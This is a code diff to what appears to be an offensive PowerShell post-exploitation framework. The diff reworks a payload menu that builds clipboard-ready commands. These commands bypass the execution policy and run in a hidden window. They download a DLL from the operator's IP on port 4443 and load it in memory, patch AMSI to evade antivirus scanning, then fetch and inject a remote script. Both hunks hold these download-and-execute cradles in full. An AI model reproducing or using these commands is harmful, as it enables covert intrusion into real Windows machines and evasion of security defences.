@@ -3013,30 +3013,24 @@ while (`$true) {
 			$_srvCmdIwr  = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
 			$global:LastInlinePS = $built.InlinePS
 			[System.IO.File]::WriteAllText($_pipePath, $_servePS, (New-Object System.Text.UTF8Encoding $False))
-			$_bootstrapCmd = $null
 			if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar -and $_alInj -and $_alInPS) {
 				try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
-				$_bootstrapCmd = "powershell -ep bypass -c `"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_srvIP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null);`$_sc=(iwr '$_serveURL' -UseBasicParsing).Content;`$_a.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,[object[]]@([int]0,`$_sc))`""
+				$_cmdPayload = "powershell -ep bypass -c `"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_srvIP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null);`$_sc=(iwr '$_serveURL' -UseBasicParsing).Content;`$_a.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,[object[]]@([int]0,`$_sc))`""
+			} else {
+				$_cmdPayload = $_srvCmdIwr
 			}
 			$_serveOk = ($null -ne $global:FileServerProcess -and -not $global:FileServerProcess.HasExited)
-			Write-Output " [1] Inline PS -- full bypass payload, paste into existing session:"
+			Write-Output " [1] PowerShell -- paste into existing PS session:"
 			Write-Output " $($built.InlinePS)"
 			Write-Output ""
-			Write-Output " [2] Serve -- iwr+scriptblock fetch, no iex/webclient/downloadstring:"
-			Write-Output " $_srvCmdIwr"
+			Write-Output " [2] CMD -- run from command prompt:"
+			Write-Output " $_cmdPayload"
 			Write-Output ""
-			if ($_bootstrapCmd) {
-				Write-Output " [3] Bootstrap -- DLL AMSI patch + in-process Runspace, strongest for CMD:"
-				Write-Output " $_bootstrapCmd"
-				Write-Output ""
-			}
-			if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' before using options 2 or 3" -ForegroundColor Red }
-			$_prompt = if ($_bootstrapCmd) { " Copy to clipboard [1] Inline PS  [2] Serve  [3] Bootstrap: " } else { " Copy to clipboard [1] Inline PS  [2] Serve: " }
-			Write-Host $_prompt -NoNewline
+			if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2" -ForegroundColor Red }
+			Write-Host " Copy to clipboard [1] PowerShell  [2] CMD: " -NoNewline
 			$_sc = (Read-Host).Trim()
 			$_clipPayload = switch ($_sc) {
-				'2' { $_srvCmdIwr }
-				'3' { if ($_bootstrapCmd) { $_bootstrapCmd } else { $built.InlinePS } }
+				'2' { $_cmdPayload }
 				default { $built.InlinePS }
 			}
 		}
@@ -3260,30 +3254,24 @@ while (`$true) {
 		[System.IO.File]::WriteAllText($_pipePath, $_servePS, (New-Object System.Text.UTF8Encoding $False))
 		$global:LastSharpRDPB64 = $_sharpRDPCmd
 		$global:LastSharpRDPCradleFile = $_pipeFile
-		$_bootstrapCmd = $null
 		if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar -and $_alInj -and $_alInPS) {
 			try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
-			$_bootstrapCmd = "powershell -ep bypass -c `"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_operatorIP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null);`$_sc=(iwr '$_serveURL' -UseBasicParsing).Content;`$_a.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,[object[]]@([int]0,`$_sc))`""
+			$_cmdPayload = "powershell -ep bypass -c `"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_operatorIP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null);`$_sc=(iwr '$_serveURL' -UseBasicParsing).Content;`$_a.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,[object[]]@([int]0,`$_sc))`""
+		} else {
+			$_cmdPayload = $_srvCmdIwr
 		}
 		$_serveOk = ($null -ne $global:FileServerProcess -and -not $global:FileServerProcess.HasExited)
-		Write-Output " [1] Inline PS -- full bypass payload, paste into existing session:"
+		Write-Output " [1] PowerShell -- paste into existing PS session:"
 		Write-Output " $($built.InlinePS)"
 		Write-Output ""
-		Write-Output " [2] Serve -- iwr+scriptblock fetch, no iex/webclient/downloadstring:"
-		Write-Output " $_srvCmdIwr"
+		Write-Output " [2] CMD -- run from command prompt:"
+		Write-Output " $_cmdPayload"
 		Write-Output ""
-		if ($_bootstrapCmd) {
-			Write-Output " [3] Bootstrap -- DLL AMSI patch + in-process Runspace, strongest for CMD:"
-			Write-Output " $_bootstrapCmd"
-			Write-Output ""
-		}
-		if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' before using options 2 or 3" -ForegroundColor Red }
-		$_prompt = if ($_bootstrapCmd) { " Copy to clipboard [1] Inline PS  [2] Serve  [3] Bootstrap: " } else { " Copy to clipboard [1] Inline PS  [2] Serve: " }
-		Write-Host $_prompt -NoNewline
+		if (-not $_serveOk) { Write-Host " [!] serve not running -- run 'serve' in local shell before using option 2" -ForegroundColor Red }
+		Write-Host " Copy to clipboard [1] PowerShell  [2] CMD: " -NoNewline
 		$_sc = (Read-Host).Trim()
 		$_clipPayload = switch ($_sc) {
-			'2' { $_srvCmdIwr }
-			'3' { if ($_bootstrapCmd) { $_bootstrapCmd } else { $built.InlinePS } }
+			'2' { $_cmdPayload }
 			default { $built.InlinePS }
 		}
 	}
